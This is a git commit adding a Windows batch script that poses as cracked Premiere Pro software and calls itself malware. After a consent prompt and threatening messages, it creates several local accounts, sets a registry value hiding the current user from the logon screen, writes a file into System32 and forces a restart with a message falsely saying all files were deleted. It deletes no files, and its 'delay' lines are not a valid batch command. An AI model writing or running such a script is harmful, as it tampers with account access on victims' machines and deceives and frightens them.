c9fcb0886cd5f48bf249f010a681f3f7bad9e0b4
Levike1M <160329754+Levike1M@users.noreply.github.com>
2026-01-09 21:03:20 +0100

    First version. Added the messages, and the user prepare. Ready to test.

---
+++ src/src.bat
@@ -0,0 +1,35 @@
+@echo off
+choice /C YN /M "This is a malware. It will delete all your files. And restart your computer several times. Do you want to continue? (Y/N)"
+if errorlevel 2 exit
+if errorlevel 1 echo So you chose to proceed. Good luck!
+echo Openinng cracked software...
+delay 500
+echo Loading assets...
+delay 1000
+echo Initializing...
+delay 1500
+echo Oops! Something went wrong...
+delay 1000
+color 4
+echo You really thought you can get Free Premier Pro?
+delay 1000
+echo Connecting with Adobe servers...
+delay 2000
+echo Say goodbye to all your files!
+delay 1000
+echo FEEL THE RAGE OF ADOBE! FEEL PAIN AND REALIZE WHAT YOU HAVE DONE!
+delay 2000
+net user Adobe_(PW: PremierProSux) PremierProSux /add
+net user Piracy éalsdkjféalskdjfaédlkdjfsaédslkfjaéldkjfkjbfvuéűáűáéűáűáűúúűáűőéűúéőáúh3hdkfjkfhcdb9876765jkhfciuhcdhlkdjfjk /add
+net user is éalsdkjféalskdjfaédlkdjfsaédslkfjaéldkjfkjbfvuéűáűáéűáűáűúúűáűőéűúéőáúh3hdkfjkfhcdb9876765jkhfciuhcdhlkdjfjk /add
+net user not éalsdkjféalskdjfaédlkdjfsaédslkfjaéldkjfkjbfvuéűáűáéűáűáűúúűáűőéűúéőáúh3hdkfjkfhcdb9876765jkhfciuhcdhlkdjfjk /add
+net user a éalsdkjféalskdjfaédlkdjfsaédslkfjaéldkjfkjbfvuéűáűáéűáűáűúúűáűőéűúéőáúh3hdkfjkfhcdb9876765jkhfciuhcdhlkdjfjk /add
+net user game éalsdkjféalskdjfaédlkdjfsaédslkfjaéldkjfkjbfvuéűáűáéűáűáűúúűáűőéűúéőáúh3hdkfjkfhcdb9876765jkhfciuhcdhlkdjfjk /add
+set "username=%username%"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %username% /t REG_DWORD /d 0 /f
+(
+echo @echo off
+echo echo hello world
+echo pause
+) > C:\Windows\System32\2_fp.bat
+shutdown /r /t 10 /c "Your computer is being restarted by Adobe Systems. All your files have been deleted due to software piracy. Piracy is a crime."
